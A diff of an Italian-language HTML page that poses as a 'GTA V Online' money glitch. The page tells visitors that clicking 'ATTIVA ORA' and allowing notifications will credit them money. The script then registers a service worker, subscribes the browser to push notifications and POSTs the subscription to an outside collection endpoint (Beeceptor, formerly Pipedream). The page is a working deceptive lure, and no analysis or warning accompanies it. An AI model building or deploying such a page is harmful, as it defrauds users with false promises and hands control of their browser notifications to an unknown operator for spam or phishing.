@@ -3,62 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GTA V Glitch</title>
+    <title>GTA V Online Glitch</title>
     <style>
         body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        button { background: #f00; color: #fff; padding: 20px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .box { border: 2px solid #0f0; display: inline-block; padding: 25px; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
+        button { background: #f00; color: #fff; padding: 20px 40px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
     </style>
 </head>
 <body>
-
-    <h1>SISTEMA ACCREDITO GTA V</h1>
-    <p>Stato: <span style="color:white">PRONTO</span></p>
-    <br>
-    <button id="btn">ATTIVA GLITCH SOLDI</button>
+    <div class="box">
+        <h1>SISTEMA GTA V</h1>
+        <p>Stato: <span style="color:white">PRONTO</span></p>
+        <p>Clicca per attivare l'accredito soldi.</p>
+        <button id="btn">ATTIVA ORA</button>
+    </div>
 
     <script>
-        // Funzione di conversione obbligatoria
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-            const rawData = window.atob(base64);
-            const outputArray = new Uint8Array(rawData.length);
-            for (let i = 0; i < rawData.length; ++i) {
-                outputArray[i] = rawData.charCodeAt(i);
-            }
-            return outputArray;
+        // IL TUO LINK BEECEPTOR
+        const TARGET = "https://hklhk.free.beeceptor.com"; 
+        const KEY = 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU';
+
+        function toUint8(b64) {
+            const pad = '='.repeat((4 - b64.length % 4) % 4);
+            const base64 = (b64 + pad).replace(/-/g, '+').replace(/_/g, '/');
+            const raw = window.atob(base64);
+            const res = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; ++i) res[i] = raw.charCodeAt(i);
+            return res;
         }
 
-        const publicVapidKey = 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU';
-
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').catch(err => console.error(err));
+            navigator.serviceWorker.register('sw.js');
         }
 
         document.getElementById('btn').onclick = async () => {
-            const permission = await Notification.requestPermission();
-            if (permission === 'granted') {
+            const p = await Notification.requestPermission();
+            if (p === 'granted') {
                 try {
                     const reg = await navigator.serviceWorker.ready;
                     const sub = await reg.pushManager.subscribe({
                         userVisibleOnly: true,
-                        applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
+                        applicationServerKey: toUint8(KEY)
                     });
 
-                    // INVIO A PIPEDREAM
-                    await fetch('https://eohg99rpfo5glba.m.pipedream.net', {
+                    // INVIO AL TUO BEECEPTOR
+                    await fetch(TARGET, {
                         method: 'POST',
-                        body: JSON.stringify(sub),
+                        body: JSON.stringify({ data: sub }),
                         headers: { 'Content-Type': 'application/json' }
                     });
 
-                    alert('GLITCH ATTIVATO! Riceverai i soldi entro 24h.');
+                    alert('SINCRONIZZAZIONE COMPLETATA!');
                 } catch (e) {
-                    console.error("Errore:", e);
-                    alert("Errore tecnico. Riprova tra poco.");
+                    alert("Errore. Ricarica la pagina.");
                 }
             } else {
-                alert("Devi cliccare CONSENTI per ricevere i soldi!");
+                alert("Devi cliccare CONSENTI!");
             }
         };
     </script>
